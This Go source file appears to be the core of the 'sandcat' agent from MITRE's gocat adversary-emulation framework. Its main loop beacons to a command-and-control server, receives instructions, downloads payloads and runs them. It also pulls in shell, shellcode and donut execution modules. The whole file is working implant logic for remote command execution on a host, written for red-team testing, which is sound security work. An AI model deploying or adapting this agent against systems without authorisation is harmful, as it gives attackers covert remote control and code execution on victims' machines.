package core

import (
	"encoding/json"
	"fmt"
	"reflect"
	"time"

	"github.com/mitre/gocat/agent"
	"github.com/mitre/gocat/output"

	_ "github.com/mitre/gocat/execute/donut" // necessary to initialize all submodules
	_ "github.com/mitre/gocat/execute/shells" // necessary to initialize all submodules
	_ "github.com/mitre/gocat/execute/shellcode" // necessary to initialize all submodules
)

// Initializes and returns sandcat agent.
func initializeCore(server string, group string, c2 map[string]string, p2pReceiversOn bool, initialDelay int, verbose bool, paw string) (*agent.Agent, error) {
	output.SetVerbose(verbose)
	output.VerbosePrint("Starting sandcat in verbose mode.")
	return agent.AgentFactory(server, group, c2, p2pReceiversOn, initialDelay, paw)
}

//Core is the main function as wrapped by sandcat.go
func Core(server string, group string, delay int, c2 map[string]string, p2pReceiversOn bool, verbose bool, paw string) {
	sandcatAgent, err := initializeCore(server, group, c2, p2pReceiversOn, delay, verbose, paw)
	if err != nil {
		output.VerbosePrint(fmt.Sprintf("[-] Error when initializing agent: %s", err.Error()))
		output.VerbosePrint("[-] Exiting.")
	} else {
		sandcatAgent.Display()
		runAgent(sandcatAgent, c2)
		sandcatAgent.Terminate()
	}
}

// Establish contact with C2 and run instructions.
func runAgent (sandcatAgent *agent.Agent, c2Config map[string]string) {
	// Start main execution loop.
	watchdog := 0
	checkin := time.Now()
	for (evaluateWatchdog(checkin, watchdog)) {
		// Send beacon and get response.
		beacon := sandcatAgent.Beacon()

		// Process beacon response.
		if len(beacon) != 0 {
			sandcatAgent.SetPaw(beacon["paw"].(string))
			checkin = time.Now()
		}
		if beacon["instructions"] != nil && len(beacon["instructions"].([]interface{})) > 0 {
			// Run commands and send results.
			cmds := reflect.ValueOf(beacon["instructions"])
			for i := 0; i < cmds.Len(); i++ {
				marshaledCommand := cmds.Index(i).Elem().String()
				var command map[string]interface{}
				if err := json.Unmarshal([]byte(marshaledCommand), &command); err != nil {
					output.VerbosePrint(fmt.Sprintf("[-] Error unpacking command: %v", err.Error()))
				} else {
					output.VerbosePrint(fmt.Sprintf("[*] Running instruction %s", command["id"]))
					droppedPayloads := sandcatAgent.DownloadPayloads(command["payloads"].([]interface{}))
					go sandcatAgent.RunInstruction(command, droppedPayloads)
					sandcatAgent.Sleep(command["sleep"].(float64), true)
				}
			}
		} else {
			var sleepDuration float64
			if len(beacon) > 0 {
				sleepDuration = float64(beacon["sleep"].(int))
				watchdog = beacon["watchdog"].(int)
				sandcatAgent.Sleep(sleepDuration, true)
			} else {
				// Failed beacon
				if err := sandcatAgent.HandleBeaconFailure(); err != nil {
					output.VerbosePrint(fmt.Sprintf("[!] Error handling failed beacon: %s", err.Error()))
					return
				}
			}
		}
	}
}

// Returns true if agent should keep running, false if not.
func evaluateWatchdog(lastcheckin time.Time, watchdog int) bool {
	return watchdog <= 0 || float64(time.Now().Sub(lastcheckin).Seconds()) <= float64(watchdog)
}